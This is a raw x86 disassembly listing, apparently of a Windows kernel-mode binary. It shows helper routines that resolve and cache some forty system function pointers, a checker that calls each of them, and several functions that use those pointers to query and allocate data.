   115f4:	mov    WORD PTR [ebp-0x8],ax
   115f8:	mov    eax,DWORD PTR [ebp-0x8]
   115fb:	add    eax,eax
   115fd:	mov    WORD PTR [ebp-0x6],ax
   11601:	mov    WORD PTR [ebp-0x8],ax
   11605:	lea    eax,[ebp-0x8]
   11608:	push   eax
   11609:	call   DWORD PTR ds:0x1f064
   1160f:	leave  
   11610:	ret    0x4
   11613:	int3   
   11614:	int3   
   11615:	int3   
   11616:	int3   
   11617:	int3   
   11618:	mov    edi,edi
   1161a:	push   ebp
   1161b:	mov    ebp,esp
   1161d:	cmp    DWORD PTR [ebp+0x8],0x0
   11621:	jge    0x11627
   11623:	and    DWORD PTR [ebp+0x8],0x0
   11627:	push   DWORD PTR [ebp+0x8]
   1162a:	call   0x10a66
   1162f:	pop    ecx
   11630:	pop    ebp
   11631:	ret    0x8
   11634:	int3   
   11635:	int3   
   11636:	int3   
   11637:	int3   
   11638:	int3   
   11639:	int3   
   1163a:	mov    edi,edi
   1163c:	push   ebp
   1163d:	mov    ebp,esp
   1163f:	mov    eax,DWORD PTR [ebp+0x8]
   11642:	test   eax,eax
   11644:	je     0x1164d
   11646:	mov    ecx,DWORD PTR [ebp+0xc]
   11649:	mov    ecx,DWORD PTR [ecx]
   1164b:	mov    DWORD PTR [eax],ecx
   1164d:	pop    ebp
   1164e:	ret    0x8
   11651:	int3   
   11652:	int3   
   11653:	int3   
   11654:	int3   
   11655:	int3   
   11656:	mov    edi,edi
   11658:	push   ebp
   11659:	mov    ebp,esp
   1165b:	mov    eax,DWORD PTR [ebp+0x8]
   1165e:	test   eax,eax
   11660:	je     0x1166f
   11662:	mov    ecx,DWORD PTR [ebp+0xc]
   11665:	mov    edx,DWORD PTR [ecx]
   11667:	mov    DWORD PTR [eax],edx
   11669:	mov    ecx,DWORD PTR [ecx+0x4]
   1166c:	mov    DWORD PTR [eax+0x4],ecx
   1166f:	pop    ebp
   11670:	ret    0x8
   11673:	int3   
   11674:	int3   
   11675:	int3   
   11676:	int3   
   11677:	int3   
   11678:	mov    edi,edi
   1167a:	push   ebp
   1167b:	mov    ebp,esp
   1167d:	push   esi
   1167e:	mov    esi,ecx
   11680:	call   0x12afc
   11685:	test   BYTE PTR [ebp+0x8],0x1
   11689:	je     0x11692
   1168b:	push   esi
   1168c:	call   0x10a9a
   11691:	pop    ecx
   11692:	mov    eax,esi
   11694:	pop    esi
   11695:	pop    ebp
   11696:	ret    0x4
   11699:	int3   
   1169a:	int3   
   1169b:	int3   
   1169c:	int3   
   1169d:	int3   
   1169e:	test   BYTE PTR ds:0x7f6ec,0x1
   116a5:	jne    0x116bd
   116a7:	or     DWORD PTR ds:0x7f6ec,0x1
   116ae:	push   0x1df64
   116b3:	call   0x115d6
   116b8:	mov    ds:0x7f6e8,eax
   116bd:	mov    eax,ds:0x7f6e8
   116c2:	ret    
   116c3:	int3   
   116c4:	int3   
   116c5:	int3   
   116c6:	int3   
   116c7:	int3   
   116c8:	test   BYTE PTR ds:0x7f6f4,0x1
   116cf:	jne    0x116e7
   116d1:	or     DWORD PTR ds:0x7f6f4,0x1
   116d8:	push   0x1df80
   116dd:	call   0x115d6
   116e2:	mov    ds:0x7f6f0,eax
   116e7:	mov    eax,ds:0x7f6f0
   116ec:	ret    
   116ed:	int3   
   116ee:	int3   
   116ef:	int3   
   116f0:	int3   
   116f1:	int3   
   116f2:	test   BYTE PTR ds:0x7f6fc,0x1
   116f9:	jne    0x11711
   116fb:	or     DWORD PTR ds:0x7f6fc,0x1
   11702:	push   0x1dfb8
   11707:	call   0x115d6
   1170c:	mov    ds:0x7f6f8,eax
   11711:	mov    eax,ds:0x7f6f8
   11716:	ret    
   11717:	int3   
   11718:	int3   
   11719:	int3   
   1171a:	int3   
   1171b:	int3   
   1171c:	test   BYTE PTR ds:0x7f704,0x1
   11723:	jne    0x1173b
   11725:	or     DWORD PTR ds:0x7f704,0x1
   1172c:	push   0x1dfda
   11731:	call   0x115d6
   11736:	mov    ds:0x7f700,eax
   1173b:	mov    eax,ds:0x7f700
   11740:	ret    
   11741:	int3   
   11742:	int3   
   11743:	int3   
   11744:	int3   
   11745:	int3   
   11746:	test   BYTE PTR ds:0x7f70c,0x1
   1174d:	jne    0x11765
   1174f:	or     DWORD PTR ds:0x7f70c,0x1
   11756:	push   0x1e01a
   1175b:	call   0x115d6
   11760:	mov    ds:0x7f708,eax
   11765:	mov    eax,ds:0x7f708
   1176a:	ret    
   1176b:	int3   
   1176c:	int3   
   1176d:	int3   
   1176e:	int3   
   1176f:	int3   
   11770:	test   BYTE PTR ds:0x7f714,0x1
   11777:	jne    0x1178f
   11779:	or     DWORD PTR ds:0x7f714,0x1
   11780:	push   0x1e030
   11785:	call   0x115d6
   1178a:	mov    ds:0x7f710,eax
   1178f:	mov    eax,ds:0x7f710
   11794:	ret    
   11795:	int3   
   11796:	int3   
   11797:	int3   
   11798:	int3   
   11799:	int3   
   1179a:	test   BYTE PTR ds:0x7f71c,0x1
   117a1:	jne    0x117b9
   117a3:	or     DWORD PTR ds:0x7f71c,0x1
   117aa:	push   0x1e064
   117af:	call   0x115d6
   117b4:	mov    ds:0x7f718,eax
   117b9:	mov    eax,ds:0x7f718
   117be:	ret    
   117bf:	int3   
   117c0:	int3   
   117c1:	int3   
   117c2:	int3   
   117c3:	int3   
   117c4:	test   BYTE PTR ds:0x7f724,0x1
   117cb:	jne    0x117e3
   117cd:	or     DWORD PTR ds:0x7f724,0x1
   117d4:	push   0x1e096
   117d9:	call   0x115d6
   117de:	mov    ds:0x7f720,eax
   117e3:	mov    eax,ds:0x7f720
   117e8:	ret    
   117e9:	int3   
   117ea:	int3   
   117eb:	int3   
   117ec:	int3   
   117ed:	int3   
   117ee:	test   BYTE PTR ds:0x7f72c,0x1
   117f5:	jne    0x1180d
   117f7:	or     DWORD PTR ds:0x7f72c,0x1
   117fe:	push   0x1e0aa
   11803:	call   0x115d6
   11808:	mov    ds:0x7f728,eax
   1180d:	mov    eax,ds:0x7f728
   11812:	ret    
   11813:	int3   
   11814:	int3   
   11815:	int3   
   11816:	int3   
   11817:	int3   
   11818:	test   BYTE PTR ds:0x7f734,0x1
   1181f:	jne    0x11837
   11821:	or     DWORD PTR ds:0x7f734,0x1
   11828:	push   0x1e0c2
   1182d:	call   0x115d6
   11832:	mov    ds:0x7f730,eax
   11837:	mov    eax,ds:0x7f730
   1183c:	ret    
   1183d:	int3   
   1183e:	int3   
   1183f:	int3   
   11840:	int3   
   11841:	int3   
   11842:	test   BYTE PTR ds:0x7f73c,0x1
   11849:	jne    0x11861
   1184b:	or     DWORD PTR ds:0x7f73c,0x1
   11852:	push   0x1e0de
   11857:	call   0x115d6
   1185c:	mov    ds:0x7f738,eax
   11861:	mov    eax,ds:0x7f738
   11866:	ret    
   11867:	int3   
   11868:	int3   
   11869:	int3   
   1186a:	int3   
   1186b:	int3   
   1186c:	test   BYTE PTR ds:0x7f744,0x1
   11873:	jne    0x1188b
   11875:	or     DWORD PTR ds:0x7f744,0x1
   1187c:	push   0x1e118
   11881:	call   0x115d6
   11886:	mov    ds:0x7f740,eax
   1188b:	mov    eax,ds:0x7f740
   11890:	ret    
   11891:	int3   
   11892:	int3   
   11893:	int3   
   11894:	int3   
   11895:	int3   
   11896:	test   BYTE PTR ds:0x7f74c,0x1
   1189d:	jne    0x118b5
   1189f:	or     DWORD PTR ds:0x7f74c,0x1
   118a6:	push   0x1e132
   118ab:	call   0x115d6
   118b0:	mov    ds:0x7f748,eax
   118b5:	mov    eax,ds:0x7f748
   118ba:	ret    
   118bb:	int3   
   118bc:	int3   
   118bd:	int3   
   118be:	int3   
   118bf:	int3   
   118c0:	test   BYTE PTR ds:0x7f754,0x1
   118c7:	jne    0x118df
   118c9:	or     DWORD PTR ds:0x7f754,0x1
   118d0:	push   0x1e154
   118d5:	call   0x115d6
   118da:	mov    ds:0x7f750,eax
   118df:	mov    eax,ds:0x7f750
   118e4:	ret    
   118e5:	int3   
   118e6:	int3   
   118e7:	int3   
   118e8:	int3   
   118e9:	int3   
   118ea:	test   BYTE PTR ds:0x7f75c,0x1
   118f1:	jne    0x11909
   118f3:	or     DWORD PTR ds:0x7f75c,0x1
   118fa:	push   0x1e18e
   118ff:	call   0x115d6
   11904:	mov    ds:0x7f758,eax
   11909:	mov    eax,ds:0x7f758
   1190e:	ret    
   1190f:	int3   
   11910:	int3   
   11911:	int3   
   11912:	int3   
   11913:	int3   
   11914:	test   BYTE PTR ds:0x7f764,0x1
   1191b:	jne    0x11933
   1191d:	or     DWORD PTR ds:0x7f764,0x1
   11924:	push   0x1e1b4
   11929:	call   0x115d6
   1192e:	mov    ds:0x7f760,eax
   11933:	mov    eax,ds:0x7f760
   11938:	ret    
   11939:	int3   
   1193a:	int3   
   1193b:	int3   
   1193c:	int3   
   1193d:	int3   
   1193e:	test   BYTE PTR ds:0x7f76c,0x1
   11945:	jne    0x1195d
   11947:	or     DWORD PTR ds:0x7f76c,0x1
   1194e:	push   0x1e1e4
   11953:	call   0x115d6
   11958:	mov    ds:0x7f768,eax
   1195d:	mov    eax,ds:0x7f768
   11962:	ret    
   11963:	int3   
   11964:	int3   
   11965:	int3   
   11966:	int3   
   11967:	int3   
   11968:	test   BYTE PTR ds:0x7f774,0x1
   1196f:	jne    0x11987
   11971:	or     DWORD PTR ds:0x7f774,0x1
   11978:	push   0x1e216
   1197d:	call   0x115d6
   11982:	mov    ds:0x7f770,eax
   11987:	mov    eax,ds:0x7f770
   1198c:	ret    
   1198d:	int3   
   1198e:	int3   
   1198f:	int3   
   11990:	int3   
   11991:	int3   
   11992:	test   BYTE PTR ds:0x7f77c,0x1
   11999:	jne    0x119b1
   1199b:	or     DWORD PTR ds:0x7f77c,0x1
   119a2:	push   0x1e22a
   119a7:	call   0x115d6
   119ac:	mov    ds:0x7f778,eax
   119b1:	mov    eax,ds:0x7f778
   119b6:	ret    
   119b7:	int3   
   119b8:	int3   
   119b9:	int3   
   119ba:	int3   
   119bb:	int3   
   119bc:	test   BYTE PTR ds:0x7f784,0x1
   119c3:	jne    0x119db
   119c5:	or     DWORD PTR ds:0x7f784,0x1
   119cc:	push   0x1e248
   119d1:	call   0x115d6
   119d6:	mov    ds:0x7f780,eax
   119db:	mov    eax,ds:0x7f780
   119e0:	ret    
   119e1:	int3   
   119e2:	int3   
   119e3:	int3   
   119e4:	int3   
   119e5:	int3   
   119e6:	test   BYTE PTR ds:0x7f78c,0x1
   119ed:	jne    0x11a05
   119ef:	or     DWORD PTR ds:0x7f78c,0x1
   119f6:	push   0x1e262
   119fb:	call   0x115d6
   11a00:	mov    ds:0x7f788,eax
   11a05:	mov    eax,ds:0x7f788
   11a0a:	ret    
   11a0b:	int3   
   11a0c:	int3   
   11a0d:	int3   
   11a0e:	int3   
   11a0f:	int3   
   11a10:	test   BYTE PTR ds:0x7f794,0x1
   11a17:	jne    0x11a2f
   11a19:	or     DWORD PTR ds:0x7f794,0x1
   11a20:	push   0x1e27a
   11a25:	call   0x115d6
   11a2a:	mov    ds:0x7f790,eax
   11a2f:	mov    eax,ds:0x7f790
   11a34:	ret    
   11a35:	int3   
   11a36:	int3   
   11a37:	int3   
   11a38:	int3   
   11a39:	int3   
   11a3a:	test   BYTE PTR ds:0x7f79c,0x1
   11a41:	jne    0x11a59
   11a43:	or     DWORD PTR ds:0x7f79c,0x1
   11a4a:	push   0x1e298
   11a4f:	call   0x115d6
   11a54:	mov    ds:0x7f798,eax
   11a59:	mov    eax,ds:0x7f798
   11a5e:	ret    
   11a5f:	int3   
   11a60:	int3   
   11a61:	int3   
   11a62:	int3   
   11a63:	int3   
   11a64:	test   BYTE PTR ds:0x7f7a4,0x1
   11a6b:	jne    0x11a83
   11a6d:	or     DWORD PTR ds:0x7f7a4,0x1
   11a74:	push   0x1e2b8
   11a79:	call   0x115d6
   11a7e:	mov    ds:0x7f7a0,eax
   11a83:	mov    eax,ds:0x7f7a0
   11a88:	ret    
   11a89:	int3   
   11a8a:	int3   
   11a8b:	int3   
   11a8c:	int3   
   11a8d:	int3   
   11a8e:	test   BYTE PTR ds:0x7f7ac,0x1
   11a95:	jne    0x11aad
   11a97:	or     DWORD PTR ds:0x7f7ac,0x1
   11a9e:	push   0x1e2d8
   11aa3:	call   0x115d6
   11aa8:	mov    ds:0x7f7a8,eax
   11aad:	mov    eax,ds:0x7f7a8
   11ab2:	ret    
   11ab3:	int3   
   11ab4:	int3   
   11ab5:	int3   
   11ab6:	int3   
   11ab7:	int3   
   11ab8:	test   BYTE PTR ds:0x7f7b4,0x1
   11abf:	jne    0x11ad7
   11ac1:	or     DWORD PTR ds:0x7f7b4,0x1
   11ac8:	push   0x1e2f8
   11acd:	call   0x115d6
   11ad2:	mov    ds:0x7f7b0,eax
   11ad7:	mov    eax,ds:0x7f7b0
   11adc:	ret    
   11add:	int3   
   11ade:	int3   
   11adf:	int3   
   11ae0:	int3   
   11ae1:	int3   
   11ae2:	test   BYTE PTR ds:0x7f7bc,0x1
   11ae9:	jne    0x11b01
   11aeb:	or     DWORD PTR ds:0x7f7bc,0x1
   11af2:	push   0x1e30e
   11af7:	call   0x115d6
   11afc:	mov    ds:0x7f7b8,eax
   11b01:	mov    eax,ds:0x7f7b8
   11b06:	ret    
   11b07:	int3   
   11b08:	int3   
   11b09:	int3   
   11b0a:	int3   
   11b0b:	int3   
   11b0c:	test   BYTE PTR ds:0x7f7c4,0x1
   11b13:	jne    0x11b2b
   11b15:	or     DWORD PTR ds:0x7f7c4,0x1
   11b1c:	push   0x1e338
   11b21:	call   0x115d6
   11b26:	mov    ds:0x7f7c0,eax
   11b2b:	mov    eax,ds:0x7f7c0
   11b30:	ret    
   11b31:	int3   
   11b32:	int3   
   11b33:	int3   
   11b34:	int3   
   11b35:	int3   
   11b36:	test   BYTE PTR ds:0x7f7cc,0x1
   11b3d:	jne    0x11b55
   11b3f:	or     DWORD PTR ds:0x7f7cc,0x1
   11b46:	push   0x1e350
   11b4b:	call   0x115d6
   11b50:	mov    ds:0x7f7c8,eax
   11b55:	mov    eax,ds:0x7f7c8
   11b5a:	ret    
   11b5b:	int3   
   11b5c:	int3   
   11b5d:	int3   
   11b5e:	int3   
   11b5f:	int3   
   11b60:	test   BYTE PTR ds:0x7f7d4,0x1
   11b67:	jne    0x11b7f
   11b69:	or     DWORD PTR ds:0x7f7d4,0x1
   11b70:	push   0x1e37e
   11b75:	call   0x115d6
   11b7a:	mov    ds:0x7f7d0,eax
   11b7f:	mov    eax,ds:0x7f7d0
   11b84:	ret    
   11b85:	int3   
   11b86:	int3   
   11b87:	int3   
   11b88:	int3   
   11b89:	int3   
   11b8a:	test   BYTE PTR ds:0x7f7dc,0x1
   11b91:	jne    0x11ba9
   11b93:	or     DWORD PTR ds:0x7f7dc,0x1
   11b9a:	push   0x1e3a8
   11b9f:	call   0x115d6
   11ba4:	mov    ds:0x7f7d8,eax
   11ba9:	mov    eax,ds:0x7f7d8
   11bae:	ret    
   11baf:	int3   
   11bb0:	int3   
   11bb1:	int3   
   11bb2:	int3   
   11bb3:	int3   
   11bb4:	test   BYTE PTR ds:0x7f7e4,0x1
   11bbb:	jne    0x11bd3
   11bbd:	or     DWORD PTR ds:0x7f7e4,0x1
   11bc4:	push   0x1e3c6
   11bc9:	call   0x115d6
   11bce:	mov    ds:0x7f7e0,eax
   11bd3:	mov    eax,ds:0x7f7e0
   11bd8:	ret    
   11bd9:	int3   
   11bda:	int3   
   11bdb:	int3   
   11bdc:	int3   
   11bdd:	int3   
   11bde:	test   BYTE PTR ds:0x7f7ec,0x1
   11be5:	jne    0x11bfd
   11be7:	or     DWORD PTR ds:0x7f7ec,0x1
   11bee:	push   0x1e3f4
   11bf3:	call   0x115d6
   11bf8:	mov    ds:0x7f7e8,eax
   11bfd:	mov    eax,ds:0x7f7e8
   11c02:	ret    
   11c03:	int3   
   11c04:	int3   
   11c05:	int3   
   11c06:	int3   
   11c07:	int3   
   11c08:	test   BYTE PTR ds:0x7f7f4,0x1
   11c0f:	jne    0x11c27
   11c11:	or     DWORD PTR ds:0x7f7f4,0x1
   11c18:	push   0x1e41a
   11c1d:	call   0x115d6
   11c22:	mov    ds:0x7f7f0,eax
   11c27:	mov    eax,ds:0x7f7f0
   11c2c:	ret    
   11c2d:	int3   
   11c2e:	int3   
   11c2f:	int3   
   11c30:	int3   
   11c31:	int3   
   11c32:	test   BYTE PTR ds:0x7f7fc,0x1
   11c39:	jne    0x11c51
   11c3b:	or     DWORD PTR ds:0x7f7fc,0x1
   11c42:	push   0x1e444
   11c47:	call   0x115d6
   11c4c:	mov    ds:0x7f7f8,eax
   11c51:	mov    eax,ds:0x7f7f8
   11c56:	ret    
   11c57:	int3   
   11c58:	int3   
   11c59:	int3   
   11c5a:	int3   
   11c5b:	int3   
   11c5c:	test   BYTE PTR ds:0x7f804,0x1
   11c63:	jne    0x11c7b
   11c65:	or     DWORD PTR ds:0x7f804,0x1
   11c6c:	push   0x1e468
   11c71:	call   0x115d6
   11c76:	mov    ds:0x7f800,eax
   11c7b:	mov    eax,ds:0x7f800
   11c80:	ret    
   11c81:	int3   
   11c82:	int3   
   11c83:	int3   
   11c84:	int3   
   11c85:	int3   
   11c86:	test   BYTE PTR ds:0x7f80c,0x1
   11c8d:	jne    0x11ca5
   11c8f:	or     DWORD PTR ds:0x7f80c,0x1
   11c96:	push   0x1e492
   11c9b:	call   0x115d6
   11ca0:	mov    ds:0x7f808,eax
   11ca5:	mov    eax,ds:0x7f808
   11caa:	ret    
   11cab:	int3   
   11cac:	int3   
   11cad:	int3   
   11cae:	int3   
   11caf:	int3   
   11cb0:	test   BYTE PTR ds:0x7f814,0x1
   11cb7:	jne    0x11ccf
   11cb9:	or     DWORD PTR ds:0x7f814,0x1
   11cc0:	push   0x1e4bc
   11cc5:	call   0x115d6
   11cca:	mov    ds:0x7f810,eax
   11ccf:	mov    eax,ds:0x7f810
   11cd4:	ret    
   11cd5:	int3   
   11cd6:	int3   
   11cd7:	int3   
   11cd8:	int3   
   11cd9:	int3   
   11cda:	test   BYTE PTR ds:0x7f81c,0x1
   11ce1:	jne    0x11cf9
   11ce3:	or     DWORD PTR ds:0x7f81c,0x1
   11cea:	push   0x1e4f2
   11cef:	call   0x115d6
   11cf4:	mov    ds:0x7f818,eax
   11cf9:	mov    eax,ds:0x7f818
   11cfe:	ret    
   11cff:	int3   
   11d00:	int3   
   11d01:	int3   
   11d02:	int3   
   11d03:	int3   
   11d04:	call   0x1169e
   11d09:	test   eax,eax
   11d0b:	jne    0x11d10
   11d0d:	xor    eax,eax
   11d0f:	ret    
   11d10:	call   0x116c8
   11d15:	test   eax,eax
   11d17:	je     0x11d0d
   11d19:	call   0x116f2
   11d1e:	test   eax,eax
   11d20:	je     0x11d0d
   11d22:	call   0x1171c
   11d27:	test   eax,eax
   11d29:	je     0x11d0d
   11d2b:	call   0x11746
   11d30:	test   eax,eax
   11d32:	je     0x11d0d
   11d34:	call   0x11770
   11d39:	test   eax,eax
   11d3b:	je     0x11d0d
   11d3d:	call   0x1179a
   11d42:	test   eax,eax
   11d44:	je     0x11d0d
   11d46:	call   0x117c4
   11d4b:	test   eax,eax
   11d4d:	je     0x11d0d
   11d4f:	call   0x117ee
   11d54:	test   eax,eax
   11d56:	je     0x11d0d
   11d58:	call   0x11818
   11d5d:	test   eax,eax
   11d5f:	je     0x11d0d
   11d61:	call   0x11842
   11d66:	test   eax,eax
   11d68:	je     0x11d0d
   11d6a:	call   0x1186c
   11d6f:	test   eax,eax
   11d71:	je     0x11d0d
   11d73:	call   0x11896
   11d78:	test   eax,eax
   11d7a:	je     0x11d0d
   11d7c:	call   0x118c0
   11d81:	test   eax,eax
   11d83:	je     0x11d0d
   11d85:	call   0x118ea
   11d8a:	test   eax,eax
   11d8c:	je     0x11d0d
   11d92:	call   0x11914
   11d97:	test   eax,eax
   11d99:	je     0x11d0d
   11d9f:	call   0x1193e
   11da4:	test   eax,eax
   11da6:	je     0x11d0d
   11dac:	call   0x11968
   11db1:	test   eax,eax
   11db3:	je     0x11d0d
   11db9:	call   0x11992
   11dbe:	test   eax,eax
   11dc0:	je     0x11d0d
   11dc6:	call   0x119bc
   11dcb:	test   eax,eax
   11dcd:	je     0x11d0d
   11dd3:	call   0x119e6
   11dd8:	test   eax,eax
   11dda:	je     0x11d0d
   11de0:	call   0x11a10
   11de5:	test   eax,eax
   11de7:	je     0x11d0d
   11ded:	call   0x11a3a
   11df2:	test   eax,eax
   11df4:	je     0x11d0d
   11dfa:	call   0x11a64
   11dff:	test   eax,eax
   11e01:	je     0x11d0d
   11e07:	call   0x11a8e
   11e0c:	test   eax,eax
   11e0e:	je     0x11d0d
   11e14:	call   0x11ab8
   11e19:	test   eax,eax
   11e1b:	je     0x11d0d
   11e21:	call   0x11ae2
   11e26:	test   eax,eax
   11e28:	je     0x11d0d
   11e2e:	call   0x11b0c
   11e33:	test   eax,eax
   11e35:	je     0x11d0d
   11e3b:	call   0x11b36
   11e40:	test   eax,eax
   11e42:	je     0x11d0d
   11e48:	call   0x11b60
   11e4d:	test   eax,eax
   11e4f:	je     0x11d0d
   11e55:	call   0x11b8a
   11e5a:	test   eax,eax
   11e5c:	je     0x11d0d
   11e62:	call   0x11bb4
   11e67:	test   eax,eax
   11e69:	je     0x11d0d
   11e6f:	call   0x11bde
   11e74:	test   eax,eax
   11e76:	je     0x11d0d
   11e7c:	call   0x11c08
   11e81:	test   eax,eax
   11e83:	je     0x11d0d
   11e89:	call   0x11c32
   11e8e:	test   eax,eax
   11e90:	je     0x11d0d
   11e96:	call   0x11c5c
   11e9b:	test   eax,eax
   11e9d:	je     0x11d0d
   11ea3:	call   0x11c86
   11ea8:	test   eax,eax
   11eaa:	je     0x11d0d
   11eb0:	call   0x11cb0
   11eb5:	test   eax,eax
   11eb7:	je     0x11d0d
   11ebd:	call   0x11cda
   11ec2:	neg    eax
   11ec4:	sbb    eax,eax
   11ec6:	neg    eax
   11ec8:	ret    
   11ec9:	int3   
   11eca:	int3   
   11ecb:	int3   
   11ecc:	int3   
   11ecd:	int3   
   11ece:	mov    edi,edi
   11ed0:	push   esi
   11ed1:	mov    esi,ecx
   11ed3:	push   DWORD PTR [esi+0x48]
   11ed6:	call   0x10a9a
   11edb:	push   DWORD PTR [esi+0x24]
   11ede:	call   0x10a9a
   11ee3:	push   DWORD PTR [esi+0x1c]
   11ee6:	call   0x10a9a
   11eeb:	push   DWORD PTR [esi+0x14]
   11eee:	call   0x10a9a
   11ef3:	push   DWORD PTR [esi+0x8]
   11ef6:	call   0x10a9a
   11efb:	push   DWORD PTR [esi]
   11efd:	call   0x10a9a
   11f02:	add    esp,0x18
   11f05:	pop    esi
   11f06:	ret    
   11f07:	int3   
   11f08:	int3   
   11f09:	int3   
   11f0a:	int3   
   11f0b:	int3   
   11f0c:	mov    edi,edi
   11f0e:	push   ebp
   11f0f:	mov    ebp,esp
   11f11:	mov    eax,ecx
   11f13:	mov    ecx,DWORD PTR [ebp+0x8]
   11f16:	mov    edx,DWORD PTR [ecx]
   11f18:	test   edx,edx
   11f1a:	je     0x11f23
   11f1c:	mov    DWORD PTR [eax],edx
   11f1e:	inc    DWORD PTR [edx+0x4]
   11f21:	jmp    0x11f26
   11f23:	and    DWORD PTR [eax],0x0
   11f26:	pop    ebp
   11f27:	ret    0x4
   11f2a:	int3   
   11f2b:	int3   
   11f2c:	int3   
   11f2d:	int3   
   11f2e:	int3   
   11f2f:	int3   
   11f30:	mov    edi,edi
   11f32:	push   ebp
   11f33:	mov    ebp,esp
   11f35:	push   esi
   11f36:	mov    esi,ecx
   11f38:	mov    ecx,DWORD PTR [esi]
   11f3a:	test   ecx,ecx
   11f3c:	je     0x11f43
   11f3e:	call   0x10ab8
   11f43:	mov    eax,DWORD PTR [ebp+0x8]
   11f46:	mov    eax,DWORD PTR [eax]
   11f48:	mov    DWORD PTR [esi],eax
   11f4a:	inc    DWORD PTR [eax+0x4]
   11f4d:	mov    eax,esi
   11f4f:	pop    esi
   11f50:	pop    ebp
   11f51:	ret    0x4
   11f54:	int3   
   11f55:	int3   
   11f56:	int3   
   11f57:	int3   
   11f58:	int3   
   11f59:	int3   
   11f5a:	mov    edi,edi
   11f5c:	push   ebp
   11f5d:	mov    ebp,esp
   11f5f:	push   ebx
   11f60:	push   esi
   11f61:	push   edi
   11f62:	mov    edi,DWORD PTR [ebp+0xc]
   11f65:	mov    esi,ecx
   11f67:	and    DWORD PTR [esi+0x4],0x0
   11f6b:	lea    eax,[edi+0x1]
   11f6e:	push   eax
   11f6f:	mov    DWORD PTR [esi+0x8],edi
   11f72:	call   0x10a66
   11f77:	push   edi
   11f78:	push   DWORD PTR [ebp+0x8]
   11f7b:	mov    ebx,eax
   11f7d:	push   ebx
   11f7e:	call   0x1dade
   11f83:	add    esp,0x10
   11f86:	inc    DWORD PTR [esi+0x4]
   11f89:	pop    edi
   11f8a:	mov    DWORD PTR [esi],ebx
   11f8c:	mov    eax,esi
   11f8e:	pop    esi
   11f8f:	pop    ebx
   11f90:	pop    ebp
   11f91:	ret    0x8
   11f94:	int3   
   11f95:	int3   
   11f96:	int3   
   11f97:	int3   
   11f98:	int3   
   11f99:	int3   
   11f9a:	mov    edi,edi
   11f9c:	push   ebp
   11f9d:	mov    ebp,esp
   11f9f:	push   ecx
   11fa0:	push   edi
   11fa1:	lea    eax,[ebp-0x4]
   11fa4:	push   eax
   11fa5:	xor    edi,edi
   11fa7:	push   edi
   11fa8:	push   edi
   11fa9:	push   0x1b
   11fab:	push   DWORD PTR [ebp+0x8]
   11fae:	call   0x11770
   11fb3:	call   eax
   11fb5:	cmp    eax,0xc0000004
   11fba:	jne    0x12022
   11fbc:	mov    ecx,DWORD PTR [ebp-0x4]
   11fbf:	push   ebx
   11fc0:	mov    ebx,DWORD PTR [ebp+0xc]
   11fc3:	movzx  edx,WORD PTR [ebx+0x2]
   11fc7:	lea    eax,[ecx-0x8]
   11fca:	cmp    edx,eax
   11fcc:	jae    0x11fd8
   11fce:	mov    WORD PTR [ebx],ax
   11fd1:	mov    eax,0x80000005
   11fd6:	jmp    0x12021
   11fd8:	push   esi
   11fd9:	push   0x20736649
   11fde:	push   ecx
   11fdf:	push   edi
   11fe0:	call   DWORD PTR ds:0x1f02c
   11fe6:	mov    esi,eax
   11fe8:	cmp    esi,edi
   11fea:	jne    0x11ff3
   11fec:	mov    eax,0xc000009a
   11ff1:	jmp    0x12020
   11ff3:	lea    eax,[ebp-0x4]
   11ff6:	push   eax
   11ff7:	push   DWORD PTR [ebp-0x4]
   11ffa:	push   esi
   11ffb:	push   0x1b
   11ffd:	push   DWORD PTR [ebp+0x8]
   12000:	call   0x11770
   12005:	call   eax
   12007:	mov    edi,eax
   12009:	test   edi,edi
   1200b:	jl     0x12015
   1200d:	push   esi
   1200e:	push   ebx
   1200f:	call   DWORD PTR ds:0x1f034
   12015:	push   0x0
   12017:	push   esi
   12018:	call   DWORD PTR ds:0x1f01c
   1201e:	mov    eax,edi
   12020:	pop    esi
   12021:	pop    ebx
   12022:	pop    edi
   12023:	leave  
   12024:	ret    0x8
   12027:	int3   
   12028:	int3   
   12029:	int3   
   1202a:	int3   
   1202b:	int3   
   1202c:	mov    edi,edi
   1202e:	push   ebp
   1202f:	mov    ebp,esp
   12031:	sub    esp,0x18
   12034:	push   0x0
   12036:	push   0x18
   12038:	lea    eax,[ebp-0x18]
   1203b:	push   eax
   1203c:	push   0x0
   1203e:	push   DWORD PTR [ebp+0x8]
   12041:	call   0x11770
   12046:	call   eax
   12048:	test   eax,eax
   1204a:	jl     0x12051
   1204c:	mov    eax,DWORD PTR [ebp-0x8]
   1204f:	jmp    0x12053
   12051:	xor    eax,eax
   12053:	leave  
   12054:	ret    0x4
   12057:	int3   
   12058:	int3   
   12059:	int3   
   1205a:	int3   
   1205b:	int3   
   1205c:	mov    edi,edi
   1205e:	push   ebp
   1205f:	mov    ebp,esp
   12061:	mov    ecx,DWORD PTR ds:0x7edbc
   12067:	sub    esp,0x38
   1206a:	push   esi
   1206b:	xor    esi,esi
   1206d:	cmp    ecx,esi
   1206f:	jne    0x12079
   12071:	or     eax,0xffffffff
   12074:	jmp    0x12154
   12079:	push   edi
   1207a:	xor    eax,eax
   1207c:	mov    DWORD PTR [ebp-0x20],esi
   1207f:	lea    edi,[ebp-0x1c]
   12082:	stos   DWORD PTR es:[edi],eax
   12083:	lea    eax,[ebp-0x18]
   12086:	push   eax
   12087:	lea    eax,[ebp-0x38]
   1208a:	push   eax
   1208b:	push   0x400
   12090:	lea    eax,[ebp-0x10]
   12093:	push   eax
   12094:	mov    DWORD PTR [ebp-0x4],esi
   12097:	mov    DWORD PTR [ebp-0x38],0x18
   1209e:	mov    DWORD PTR [ebp-0x34],esi
   120a1:	mov    DWORD PTR [ebp-0x2c],esi
   120a4:	mov    DWORD PTR [ebp-0x30],esi
   120a7:	mov    DWORD PTR [ebp-0x28],esi
   120aa:	mov    DWORD PTR [ebp-0x24],esi
   120ad:	mov    DWORD PTR [ebp-0x18],ecx
   120b0:	mov    DWORD PTR [ebp-0x14],esi
   120b3:	call   0x1169e
   120b8:	call   eax
   120ba:	mov    edi,eax
   120bc:	cmp    edi,esi
   120be:	jl     0x12151
   120c4:	push   ebx
   120c5:	lea    eax,[ebp-0xc]
   120c8:	push   eax
   120c9:	push   0x8
   120cb:	push   DWORD PTR [ebp-0x10]
   120ce:	call   0x118ea
   120d3:	call   eax
   120d5:	mov    ebx,DWORD PTR ds:0x1f060
   120db:	mov    edi,eax
   120dd:	cmp    edi,esi
   120df:	jl     0x1214b
   120e1:	lea    eax,[ebp-0x4]
   120e4:	push   eax
   120e5:	push   0x1
   120e7:	push   esi
